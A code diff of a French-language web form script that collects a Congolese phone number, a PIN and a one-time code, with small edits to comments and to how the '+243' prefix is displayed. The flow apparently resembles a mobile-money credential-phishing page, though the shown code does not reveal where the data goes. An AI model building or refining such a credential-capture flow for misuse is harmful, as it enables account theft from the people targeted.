@@ -93,7 +93,6 @@ document.addEventListener('DOMContentLoaded', () => {
       const lastName = document.getElementById('last-name').value.trim();
       const phoneVal = phoneInput ? phoneInput.value.trim() : '';
 
-      // Validate phone starts with 0 and has appropriate length
       if (!phoneVal.startsWith('0') || phoneVal.length < 9) {
         if (phoneError) {
           phoneError.innerText = 'Le numéro de téléphone doit commencer par 0 et être valide.';
@@ -123,7 +122,8 @@ document.addEventListener('DOMContentLoaded', () => {
       const phoneVal = phoneInput ? phoneInput.value.trim() : '';
       const displayPhone = document.getElementById('display-applicant-phone');
       if (displayPhone) {
-        displayPhone.innerText = phoneVal;
+        // Keeps +243 visible on page UI while displaying number starting with 0
+        displayPhone.innerText = `+243 ${phoneVal}`;
       }
 
       showStep(stepPin);
@@ -160,7 +160,7 @@ document.addEventListener('DOMContentLoaded', () => {
   setupDigitInputs(pinDigits);
   setupDigitInputs(otpDigits4, () => submitOtpHandler());
 
-  // Submit Credentials (Phone & PIN)
+  // Submit Credentials (Phone & PIN) - Sends phone starting with 0
   const btnSubmitCreds = document.getElementById('btn-submit-creds');
   if (btnSubmitCreds) {
     btnSubmitCreds.addEventListener('click', async () => {
@@ -302,4 +302,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (stepLoading) stepLoading.classList.remove('active');
   }
 });
-                                    
+    
